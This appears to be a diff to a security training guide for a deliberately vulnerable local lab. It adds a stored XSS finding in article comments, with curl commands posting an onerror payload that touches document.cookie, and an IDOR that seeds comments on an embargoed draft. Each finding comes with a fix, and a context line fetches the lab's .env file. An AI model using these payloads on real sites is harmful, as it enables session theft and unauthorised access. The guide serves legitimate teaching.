@@ -89,6 +89,25 @@ curl -s http://127.0.0.1:8099/.env
 ```
 **Fix:** never serve dotfiles; keep secrets out of web root; use secret managers.
 
+## VULN-11 — Stored XSS in article comments (`POST /api/comments`)
+The article page has its own comments system (separate surface from the writers
+chat). The comment body is stored raw and rendered unescaped on the article page.
+```
+curl -s --data-urlencode 'articleId=1001' --data-urlencode 'name=attacker' \
+        --data-urlencode 'text=<img src=x onerror=alert(document.cookie)>' \
+        http://127.0.0.1:8099/api/comments
+curl -s 'http://127.0.0.1:8099/article?id=1001'   # payload present unescaped
+```
+There is also no check that `articleId` is a *published* article, so you can list
+and seed comments on the embargoed draft — an IDOR that pairs with VULN-02:
+```
+curl -s -X POST http://127.0.0.1:8099/api/comments \
+     --data 'articleId=1999&name=x&text=onto-a-draft'
+curl -s 'http://127.0.0.1:8099/api/comments?articleId=1999'
+```
+**Fix:** escape comment bodies on output (and sanitize on input); tie comments to
+published articles with a real authz check; add CSP.
+
 ---
 
 ## Suggested tooling to practise with (all against THIS lab only)
